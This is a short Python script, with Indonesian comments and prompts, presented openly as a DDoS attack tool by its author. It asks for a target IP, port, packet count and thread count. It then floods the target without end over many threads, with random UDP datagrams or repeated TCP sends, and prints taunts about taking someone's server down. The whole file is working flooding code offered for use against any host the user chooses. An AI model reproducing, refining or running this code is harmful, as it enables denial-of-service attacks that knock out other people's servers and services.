#!/usr/bin/env python3
#Semoga yang curi script ortunya sehat selalu
#Ddos by KalzzX
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by KalzzX")
print("Kalau Mau Pakek Bilang Dulu")
print("Mau rename? PM me ")
ip = str(input(" DdosAttackByKalzzX | Ip:"))
port = int(input(" DdosAttackByKalzz | Port:"))
choice = str(input(" DdosAttackByKalzzX | Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByKalzz | Packets:"))
threads = int(input(" DdosAttackByKalzzX | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[?]","[!]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Sabar lagi di ddos nih!!! |")
		except:
			print("[!] | Server orang down we!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[?]","[!]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KalzzX nih dekk!!!")
		except:
			s.close()
			print("[*] Down lagi we!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
